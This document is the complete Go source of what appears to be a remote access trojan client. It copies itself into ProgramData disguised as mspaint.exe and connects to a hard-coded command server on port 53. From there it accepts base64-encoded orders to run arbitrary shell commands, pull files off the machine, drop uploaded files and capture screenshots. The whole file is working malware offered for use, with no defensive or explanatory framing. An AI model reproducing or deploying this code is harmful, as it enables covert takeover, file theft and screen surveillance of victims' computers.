package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/axgle/mahonia"
	"github.com/kbinani/screenshot"
)

const (
	IP      = "127.0.0.1:53" //"192.168.1.209:53"
	CONNPWD = "cmc123456"
)

var (
	Timeout = 30 * time.Second
	charset = "utf-8"
)

func main() {
	if runtime.GOOS == "windows" {
		targetPath := os.Getenv("systemdrive") + "\\ProgramData\\"
		targetFile := targetPath + "mspaint.exe"
		os.Mkdir(targetPath, os.ModePerm)

		//获取当前文件执行的绝对路径
		currentFile, _ := exec.LookPath(os.Args[0])
		currentFileAbs, _ := filepath.Abs(currentFile)

		if currentFileAbs == targetFile {
			//删除原哟文件
			fmt.Println(len(os.Args))
			if len(os.Args) > 1 {
				err := os.Chmod(os.Args[1], 0777)
				if err != nil {
					fmt.Println(err)
				}
			}
			for {
				connect()
			}
		} else {
			//设定一个目标文件
			_, err := os.Stat(targetFile)
			if err != nil {
				//打开源文件
				srcFile, _ := os.Open(currentFile)
				//创建目标文件
				desFile, err := os.Create(targetFile)
				if err != nil {
					fmt.Println(err)
				}
				//copy源文件的内容到目标文件
				_, err = io.Copy(desFile, srcFile)
				if err != nil {
					fmt.Println(err)
				}

				//设定目标文件权限 0777， 这样才可以启动
				err = os.Chmod(targetFile, 0777)
				if err != nil {
					fmt.Println(err)
				}
				//不能使用defer，需要在执行前关闭文件句柄
				srcFile.Close()
				desFile.Close()
				//start 启动目标程序，进程不需要等待交互
				mCommand(targetFile, currentFileAbs)
			} else {
				//如果文件已经存在，start启动目标程序，进程不需要等待交互
				mCommand(targetFile, currentFileAbs)
			}
		}
	} else {
		for {
			connect()
		}
	}
}

//连接远程服务器
func connect() {
	conn, err := net.Dial("tcp", IP)
	if err != nil {
		fmt.Println("Connection...")
		for {
			connect()
		}
	}

	errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
	conn.Write([]byte(string(errMsg) + "\n"))
	fmt.Println("Connection success...")

	for {
		//等待接受指令，以\n为结束符，所有指令都经过base64处理
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err == io.EOF {
			//服务断开
			conn.Close()
			connect()
		}

		//收到指令
		decodedCase, _ := base64.StdEncoding.DecodeString(message)
		command := string(decodedCase)
		cmdParameter := strings.Split(command, " ")
		fmt.Println("收到指令：", cmdParameter)
		switch cmdParameter[0] {
		case "back":
			conn.Close()
			connect()
		case "exit":
			conn.Close()
			os.Exit(0)
		case "charset":
			if len(cmdParameter) == 2 {
				charset = cmdParameter[1]
			}
		case "upload":
			uploadOutput, _ := bufio.NewReader(conn).ReadString('\n')
			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
			encData, _ := bufio.NewReader(conn).ReadString('\n')
			decData, _ := base64.URLEncoding.DecodeString(encData)
			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)

		case "download":
			//第一步收到下载指令，什么都不做，继续等待下载路径
			download, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println("第一步什么都不做")
			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
			fmt.Println(string(decodeDownload))
			file, err := ioutil.ReadFile(string(decodeDownload))
			if err != nil {
				//找不到文件，发送错误
				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
				conn.Write([]byte(string(errMsg) + "\n"))
				break
			}
			fmt.Println("读取文件结束")
			//发送一个download指令给服务端准备接受
			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
			conn.Write([]byte(string(srvDownloadMsg) + "\n"))
			//读取文件上传
			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))
			fmt.Println("文件上传结束")

		case "screenshot":
			TakeScreenShot()
			file, err := ioutil.ReadFile(getScreenshotFilename())
			if err != nil {
				//找不到文件，发送错误消息
				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
				conn.Write([]byte(string(errMsg) + "\n"))
				break
			}
			//发送一个download指令给服务器，准备接受
			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("screenshot"))
			conn.Write([]byte(string(srvDownloadMsg) + "\n"))
			//读取图片文件上传
			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))

		case "getos":
			if runtime.GOOS == "windows" {
				command = "wmic os get name"
			} else {
				command = "uname -a"
			}
			fallthrough
		default:
			cmdArray := strings.Split(command, " ")
			cmdSlice := cmdArray[1:]
			out, outerr := mCommandTimeOut(cmdArray[0], cmdSlice...)
			if outerr != nil {
				out = []byte(outerr.Error())
			}
			//解决命令行输出编码问题
			if charset != "utf-8" {
				out = []byte(ConverToString(string(out), charset, "utf-8"))
			}
			encoded := base64.StdEncoding.EncodeToString(out)
			conn.Write([]byte(encoded + "\n"))
		}
	}
}

func TakeScreenShot() {
	n := screenshot.NumActiveDisplays()
	fpath := getScreenshotFilename()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			connect()
		}
		file, _ := os.Create(fpath)
		defer file.Close()
		png.Encode(file, img)
	}
}

func ConverToString(src, srcCode, tagCode string) string {
	srcCoder := mahonia.NewDecoder(srcCode)
	srcResult := srcCoder.ConvertString(src)
	tagCoder := mahonia.NewDecoder(tagCode)
	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
	result := string(cdata)
	return result
}

func getScreenshotFilename() string {
	var (
		filepath string
	)
	if runtime.GOOS == "windows" {
		filepath = os.Getenv("systemdrive") + "\\ProgramData\\tmp.png"
	} else {
		filepath = "/tmp/.tmp.png"
	}
	return filepath
}

func mCommandTimeOut(name string, arg ...string) ([]byte, error) {
	ctxt, cancel := context.WithTimeout(context.Background(), Timeout)
	defer cancel()
	//通过上下文执行，设置超时
	cmd := exec.CommandContext(ctxt, name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{}

	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return buf.Bytes(), err
	}

	if err := cmd.Wait(); err != nil {
		return buf.Bytes(), err
	}

	return buf.Bytes(), nil
}

func mCommand(name string, arg ...string) {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	err := cmd.Start()
	if err != nil {
		fmt.Println(err)
	}
}
